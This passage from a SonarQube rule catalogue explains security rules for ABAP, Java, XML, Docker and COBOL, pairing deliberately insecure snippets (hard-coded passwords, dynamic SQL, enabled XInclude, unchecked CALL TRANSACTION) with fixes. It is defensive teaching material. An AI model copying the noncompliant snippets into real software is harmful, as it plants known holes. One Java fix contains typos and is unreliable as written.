</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
DATA: password(10) VALUE 'secret123',
           pwd(10) VALUE 'secret123'.
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1493">
              abap:S1493
            </a>
          </td>
          <td>
            <details>
              <p>There are two main reasons to ban dynamic clauses in <code>SELECT</code> statements.</p>
<p>The first relates to maintainability. One of the nice features of ABAP Design Time is the connection to the data dictionary; you get syntax errors
if you try to address table fields that are not present anymore or that have typos. With dynamic SQL, the ability to statically check the code for
this type of error is lost.</p>
<p>The other more critical reason relates to security. By definition, dynamic clauses make an application susceptible to SQL injection attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The SQL statement can be written without dynamic clauses. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not use dynamic clauses in "SELECT" statements.</p>
<h2>Sensitive Code Example</h2>
<pre>
SELECT (select_clause)
 FROM (from_clause) CLIENT SPECIFIED INTO &lt;fs&gt;
 WHERE (where_clause)
 GROUP BY (groupby_clause) HAVING (having_clause)
 ORDER BY (orderby_clause).
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT *
 FROM db_persons INTO us_persons
 WHERE country IS 'US'.
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP Top 10 2021 Category A3</a> - Injection </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/89">MITRE, CWE-89</a> - SQL Injection </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S2809">
              abap:S2809
            </a>
          </td>
          <td>
            <details>
              <p>Using "CALL TRANSACTION" statements without an authority check is security sensitive. Its access should be restricted to specific users.</p>
<p>This rule raises when a <code>CALL TRANSACTION</code> has no explicit authorization check, i.e. when:</p>
<ul>
  <li> the <code>CALL TRANSACTION</code> statement is not followed by <code>WITH AUTHORITY-CHECK</code>. </li>
  <li> the <code>CALL TRANSACTION</code> statement is not following an <code>AUTHORITY-CHECK</code> statement. </li>
  <li> the <code>CALL TRANSACTION</code> statement is not following a call to the <code>AUTHORITY_CHECK_TCODE</code> function. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the <code>CALL TRANSACTION</code> statement is restricted to the right users. </li>
</ul>
<p>There is a risk if you answered no to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check current user’s authorization before every <code>CALL TRANSACTION</code> statement. Since ABAP 7.4 this should be done by appending <code>WITH
AUTHORITY-CHECK</code> to <code>CALL TRANSACTION</code> statements. In earlier versions the <code>AUTHORITY-CHECK</code> statement or a call to the
<code>AUTHORITY_CHECK_TCODE</code> function can be used.</p>
<p>Note that since ABAP 7.4 any <code>CALL TRANSACTION</code> statement not followed by <code>WITH AUTHORITY-CHECK</code> or <code>WITHOUT
AUTHORITY-CHECK</code> <a href="https://help.sap.com/doc/abapdocu_751_index_htm/7.51/en-US/abapcall_transaction_authority.htm">is obsolete</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
CALL TRANSACTION 'MY_DIALOG'.  " Sensitive as there is no apparent authorization check. It is also obsolete since ABAP 7.4.
</pre>
<h2>Compliant Solution</h2>
<pre>
AUTHORITY-CHECK OBJECT 'S_DIAGID'
                  ID 'ACTVT' FIELD '03'.
IF sy-subrc &lt;&gt; 0.
  " show an error message...
ENDIF.

CALL TRANSACTION 'MY_DIALOG'. " Ok but obsolete since ABAP 7.4.
</pre>
<p>or</p>
<pre>
CALL FUNCTION 'AUTHORITY_CHECK_TCODE'
  exporting
    tcode  = up_fdta
  exceptions
    ok     = 0
    others = 4.
IF sy-subrc &lt;&gt; 0.
  " show an error message...
ENDIF.

CALL TRANSACTION up_fdta USING up_bdc mode 'E'. " Ok but obsolete since ABAP 7.4.
</pre>
<p>or</p>
<pre>
CALL TRANSACTION 'MY_DIALOG' WITH AUTHORITY-CHECK. " Recommended way since ABAP 7.4.
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised when <code>CALL TRANSACTION</code> is followed by <code>WITHOUT AUTHORITY-CHECK</code> as it explicitly says that the
TRANSACTION does not require an authorization check.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/285">MITRE, CWE-285</a> - Improper Authorization </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/862">MITRE, CWE-862</a> - Missing Authorization </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S4790">
              abap:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<p>This rule raises an issue when <code>MD5_CALCULATE_HASH_FOR_RAW</code> or <code>MD5_CALCULATE_HASH_FOR_CHAR</code> functions are used.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/1240">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4684">
              java:S4684
            </a>
          </td>
          <td>
            <details>
              <p>With Spring, when a request mapping method is configured to accept bean objects as arguments, the framework will automatically bind HTTP parameters
to those objects' properties. If the targeted beans are also persistent entities, the framework will also store those properties in the storage
backend, usually the application’s database.</p>
<h2>Why is this an issue?</h2>
<p>By accepting persistent entities as method arguments, the application allows clients to manipulate the object’s properties directly.</p>
<h3>What is the potential impact?</h3>
<p>Attackers could forge malicious HTTP requests that will alter unexpected properties of persistent objects. This can lead to unauthorized
modifications of the entity’s state. This is known as a <strong>mass assignment</strong> attack.</p>
<p>Depending on the affected objects and properties, the consequences can vary.</p>
<h4>Privilege escalation</h4>
<p>If the affected object is used to store the client’s identity or permissions, the attacker could alter it to change their entitlement on the
application. This can lead to horizontal or vertical privilege escalation.</p>
<h4>Security checks bypass</h4>
<p>Because persistent objects are modified directly without prior logic, attackers could exploit this issue to bypass security measures otherwise
enforced by the application. For example, an attacker might be able to change their e-mail address to an invalid one by directly setting it without
going through the application’s email validation process.</p>
<p>The same could also apply to passwords that attackers could change without complexity validation or knowledge of their current value.</p>
<h2>How to fix it in Java EE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a mass assignment attack because it allows modifying the <code>User</code> persistent entities thanks to
maliciously forged <code>Wish</code> object properties.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.persistence.Entity;

@Entity
public class Wish {
  Long productId;
  Long quantity;
  Client client;
}

@Entity
public class Client {
  String clientId;
  String name;
  String password;
}

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class PurchaseOrderController {

  @RequestMapping(path = "/saveForLater", method = RequestMethod.POST)
  public String saveForLater(Wish wish) { // Noncompliant
    session.save(wish);
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class WishDTO {
  Long productId;
  Long quantity;
  Long clientId;
}

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class PurchaseOrderController {

  @RequestMapping(path = "/saveForLater", method = RequestMethod.POST)
  public String saveForLater(WishDTO wish) {
    Wish persistentWish = new Wish();
    persistentWish.productId = wish.productId
    persistentWish.quantity = wish.quantity
    persistentWish.client = getClientById(with.clientId)
    session.save(persistentWish);
  }
}
</pre>
<h3>How does this work?</h3>
<p>The compliant code implements a Data Transfer Object (DTO) layer. Instead of accepting a persistent <code>Wish</code> entity as a parameter, the
vulnerable method accepts a <code>WishDTO</code> object with a safe, minimal set of properties. It then instantiates a persistent entity and
initializes it based on the DTO properties' values. The resulting object can safely be persisted in the database.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> OWASP - <a href="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html">Mass Assignment Cheat Sheet</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 - Category A8 - Software and Data
  Integrity Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 - Category A5 - Broken Access
  Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/915">CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object
  Attributes</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<p>OWASP O2 Platform Blog - <a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf">Two Security
Vulnerabilities in the Spring Framework’s MVC</a></p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6373">
              java:S6373
            </a>
          </td>
          <td>
            <details>
              <p>XML standard allows the inclusion of XML files with the <code>xinclude</code> element. When an XML parser component is set up with the
<code>http://apache.org/xml/features/xinclude</code> feature, it will follow the standard and allow the inclusion of remote files.</p>
<h2>Why is this an issue?</h2>
<p>When the XML parser will encounter an <code>xinclude</code> element, it will try to load the file pointed to by the <code>href</code> attribute
into the document. Included files can either be local files found on the file system of the application server, or remote files that are downloaded
over HTTP, SMB, or other protocols, depending on the capabilities of the application and server.</p>
<p>The files that can be accessed that way are only limited by the entitlement of the application on the local system and the network filtering the
server is subject to.</p>
<p>This issue is particularly severe when the XML parser is used to parse untrusted documents. For example, when user-submitted XML messages are
parsed that way.</p>
<h3>What is the potential impact?</h3>
<p>Allowing the inclusion of arbitrary files in XML documents can have two main consequences depending on what type of file is included: local or
remote.</p>
<h4>Sensitive file disclosure</h4>
<p>If the application allows the inclusion of arbitrary files through the use of the <code>xinclude</code> element, it might be used to disclose
arbitrary files from the local file system. Depending on the application’s permissions on the file system, configuration files, runtime secrets, or
Personally Identifiable Information could be leaked.</p>
<p>This is particularly true if the affected parser is used to process untrusted XML documents.</p>
<h4>Server-side request forgery</h4>
<p>When used to retrieve remote files, the application will send network requests to remote hosts. Moreover, it will do so from its current network
location, which can have severe consequences if the application server is located on a sensitive network, such as the company corporate network or a
DMZ hosting other applications.</p>
<p>Attackers exploiting this issue could try to access internal backend services or corporate file shares. It could allow them to access more
sensitive files, bypass authentication mechanisms from frontend applications, or exploit further vulnerabilities in the local services. Note that, in
some cases, the requests sent from the application can be automatically authenticated on federated locations. This is often the case in Windows
environments when using Active Directory federated authentication.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable because it explicitly enables the <code>xinclude</code> feature.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.xml.parsers.SAXParserFactory;

SAXParserFactory factory = SAXParserFactory.newInstance();

factory.setXIncludeAware(true); // Noncompliant
factory.setFeature("http://apache.org/xml/features/xinclude", true); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.xml.parsers.SAXParserFactory;

SAXParserFactory factory = SAXParserFactory.newInstance();

factory.setXIncludeAware(false);
factory.setFeature("http://apache.org/xml/features/xinclude", false);
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> OWASP - <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java">OWASP XXE Prevention
  Cheat Sheet</a> </li>
  <li> Java documentation - <a
  href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC">XML External Entity Injection Attack</a> </li>
  <li> W3C - <a href="https://www.w3.org/TR/xinclude-11/">XML Inclusions (XInclude) Version 1.1</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 - Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 - Category A5 - Security Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Improper Restriction of XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5679">
              java:S5679
            </a>
          </td>
          <td>
            <details>
              <p>The Security Assertion Markup Language (SAML) is a widely used standard in single sign-on systems. In a simplified version, the user authenticates
to an Identity Provider which generates a signed SAML Response. This response is then forwarded to a Service Provider for validation and
authentication.</p>
<h2>Why is this an issue?</h2>
<p>If the Service Provider does not manage to properly validate the incoming SAML response message signatures, attackers might be able to manipulate
the response content without the application noticing. Especially, they might be able to alter the authentication-targeted user.</p>
<h3>What is the potential impact?</h3>
<p>By exploiting this vulnerability, an attacker can manipulate the SAML Response to impersonate a different user. This, in turn, can have various
consequences on the application’s security.</p>
<h3>Unauthorized Access</h3>
<p>Exploiting this vulnerability allows an attacker with authenticated access to impersonate other users within the SAML-based SSO system. This can
lead to unauthorized access to sensitive information, resources, or functionalities the attacker should not have. By masquerading as legitimate users,
the attacker can bypass authentication mechanisms and gain unauthorized privileges, potentially compromising the entire system. By impersonating a
user with higher privileges, the attacker can gain access to additional resources. Privilege escalation can lead to further compromise of other
systems and unauthorized access to critical infrastructure.</p>
<h3>Data Breaches</h3>
<p>With the ability to impersonate other users, an attacker can gain access to sensitive data stored within the SAML-based SSO system. This includes
personally identifiable information (PII), financial data, intellectual property, or any other confidential information. Data breaches can result in
reputational damage, legal consequences, financial losses, and harm to individuals whose data is exposed.</p>
<h2>How to fix it in Spring</h2>
<h3>Code examples</h3>
<p>The following code examples are vulnerable because they explicitly include comments in signature checks. An attacker is able to change the field
identifying the authenticated user with XML comments.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import org.opensaml.xml.parse.StaticBasicParserPool;
import org.opensaml.xml.parse.ParserPool;

public ParserPool parserPool() {
  StaticBasicParserPool staticBasicParserPool = new StaticBasicParserPool();
  staticBasicParserPool.setIgnoreComments(false); // Noncompliant
  return staticBasicParserPool;
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
import org.opensaml.xml.parse.BasicParserPool;
import org.opensaml.xml.parse.ParserPool;

public ParserPool parserPool() {
  BasicParserPool basicParserPool = new BasicParserPool();
  basicParserPool.setIgnoreComments(false); // Noncompliant
  return basicParserPool;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import org.opensaml.xml.parse.StaticBasicParserPool;
import org.opensaml.xml.parse.ParserPool;

public ParserPool parserPool() {
  return new StaticBasicParserPool();
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
import org.opensaml.xml.parse.BasicParserPool;
import org.opensaml.xml.parse.ParserPool;

public ParserPool parserPool() {
  return new BasicParserPool();
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> OpenSAML API - <a href="https://javadoc.io/doc/org.opensaml/xmltooling/latest/org/opensaml/xml/parse/BasicParserPool.html">Class
  BasicParserPool</a> </li>
  <li> OpenSAML API - <a href="https://javadoc.io/doc/org.opensaml/xmltooling/latest/org/opensaml/xml/parse/StaticBasicParserPool.html">Class
  StaticBasicParserPool</a> </li>
  <li> W3C Recommendation - <a href="https://www.w3.org/TR/xml-c14n11/">Canonical XML Version 1.1</a> </li>
  <li> W3C Recommendation - <a href="https://www.w3.org/TR/xmldsig-core1/">XML Signature Syntax and Processing Version 1.1</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Cisco Duo - <a href="https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations">Duo Finds SAML Vulnerabilities
  Affecting Multiple Implementations</a> </li>
  <li> Spring blog - <a href="https://spring.io/blog/2018/03/01/spring-security-saml-and-this-week-s-saml-vulnerability">Spring Security SAML and this
  week’s SAML Vulnerability</a> </li>
  <li> Spring Security SAML - <a href="https://github.com/spring-projects/spring-security-saml/issues/228">Issue #228 Multiple SAML libraries may
  allow authentication bypass via incorrect XML canonicalization and DOM traversal</a> </li>
  <li> CVE - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11427">CVE-2017-11427</a> </li>
  <li> CVE - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11428">CVE-2017-11428</a> </li>
  <li> CVE - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11429">CVE-2017-11429</a> </li>
  <li> CVE - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11430">CVE-2017-11430</a> </li>
  <li> CVE - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0489">CVE-2018-0489</a> </li>
  <li> CVE - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7340">CVE-2018-7340</a> </li>
</ul>
<h2>Standards</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5604">
              xml:S5604
            </a>
          </td>
          <td>
            <details>
              <p>Permissions that can have a large impact on user privacy, marked as <a
href="https://developer.android.com/reference/android/Manifest.permission">dangerous or "not for use by third-party applications" by Android</a>,
should be requested only if they are really necessary to implement critical features of an application.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> It is not sure that <code>dangerous</code> permissions requested by the application are <a
  href="https://developer.android.com/training/permissions/usage-notes#avoid_requesting_unnecessary_permissions">really necessary</a>. </li>
  <li> The users are not <a href="https://developer.android.com/training/permissions/usage-notes#be_transparent">clearly informed</a> why and when
  dangerous permissions are requested by the application. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to carefully review all the permissions and to use <code>dangerous</code> ones only if they are really necessary.</p>
<h2>Sensitive Code Example</h2>
<p>In AndroidManifest.xml:</p>
<pre>
&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt; &lt;!-- Sensitive --&gt;
&lt;uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" /&gt; &lt;!-- Sensitive --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt; &lt;!-- Compliant --&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/250">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li>
  <li> <a href="https://developer.android.com/training/permissions/usage-notes">developer.android.com</a> - App permissions best practices </li>
  <li> <a href="https://play.google.com/about/privacy-security-deception/permissions/">Google Play</a> - Privacy, Security, and Deception -
  Permissions </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6500">
              docker:S6500
            </a>
          </td>
          <td>
            <details>
              <p>Installing recommended packages automatically can lead to vulnerabilities in the Docker image.</p>
<p>Potentially unnecessary packages are installed via a known Debian package manager. These packages will increase the attack surface of the created
container as they might contain unidentified vulnerabilities or malicious code. Those packages could be used as part of a broader supply chain attack.
In general, the more packages are installed in a container, the weaker its security posture is.<br> Depending on the introduced vulnerabilities, a
malicious actor accessing such a container could use these for privilege escalation.<br> Removing unused packages can also significantly reduce your
Docker image size.</p>
<p>To be secure, remove unused packages where possible and ensure images are subject to routine vulnerability scans.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Container vulnerability scans are not performed. </li>
</ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid installing package dependencies that are not strictly required. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Sensitive
RUN apt install -y build-essential

# Sensitive
RUN apt-get install -y build-essential

# Sensitive
RUN aptitude install -y build-essential
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
FROM ubuntu:22.04

RUN apt --no-install-recommends install -y build-essential

RUN apt-get --no-install-recommends install -y build-essential

RUN aptitude --without-recommends install -y build-essential
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.debian.org/doc/debian-policy/ch-relationships.html">Debian Documentation</a> - Binary Dependencies </li>
  <li> <a href="https://ubuntu.com/blog/we-reduced-our-docker-images-by-60-with-no-install-recommends">Ubuntu Blog</a> - Container size reduction
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:S4507">
              cobol:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers</p>
<p><code>WITH DEBUGGING MODE</code> activates all debug lines (ones with 'D' or 'd' in the indicator area). This clause should not be used in
production.</p>
<h2>Sensitive Code Example</h2>
<pre>
SOURCE-COMPUTER. IBM-370 WITH DEBUGGING MODE.
</pre>
<h2>Compliant Solution</h2>
<pre>
SOURCE-COMPUTER. IBM-370.
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/215">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:SQL.SelectWithNoWhereClauseCheck">
              cobol:SQL.SelectWithNoWhereClauseCheck
            </a>
          </td>
          <td>
            <details>
              <p>Although the <code>WHERE</code> condition is optional in a <code>SELECT</code> statement, for performance and security reasons, a
<code>WHERE</code> clause should always be specified to prevent reading the whole table.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The whole table is not required. </li>
  <li> The table contains sensitive information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Add a "WHERE" condition to "SELECT" statements.</p>
<h2>Sensitive Code Example</h2>
<pre>
SELECT * FROM db_persons INTO us_persons
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM db_persons INTO us_persons WHERE country IS 'US'
</pre>
<h2>Exceptions</h2>
<p>Not having a WHERE clause is acceptable in read-only cursors as results are generally sorted and it is possible to stop processing in the
middle.</p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:SQL.DynamicSqlCheck">
              cobol:SQL.DynamicSqlCheck
            </a>
          </td>
          <td>
            <details>
              <p>It is a bad practice to use Dynamic SQL. It differs from static embedded SQL in that part or all of the actual SQL commands may be stored in a host
variable that is built on the fly during execution of the program. In the extreme case, the SQL commands are generated in their entirety by the
application program at run time. While dynamic SQL is more flexible than static embedded SQL, it does require additional overhead and is much more
difficult to understand and to maintain.</p>
<p>Moreover, dynamic SQL may expose the application to SQL injection vulnerabilities.</p>
<p>This rule raises an issue when <code>PREPARE</code> or <code>EXECUTE IMMEDIATE</code> is used.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The SQL statement can be written without dynamic clauses. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not use dynamic clauses in "SELECT" statements.</p>
<h2>Sensitive Code Example</h2>
<pre>
EXEC SQL PREPARE SEL INTO :SQLDA FROM :STMTBUF END-EXEC.
</pre>
<h2>Compliant Solution</h2>
<pre>
EXEC SQL SELECT * FROM tableName END-EXEC.
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP Top 10 2021 Category A3</a> - Injection </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/89">MITRE, CWE-89</a> - SQL Injection </li>
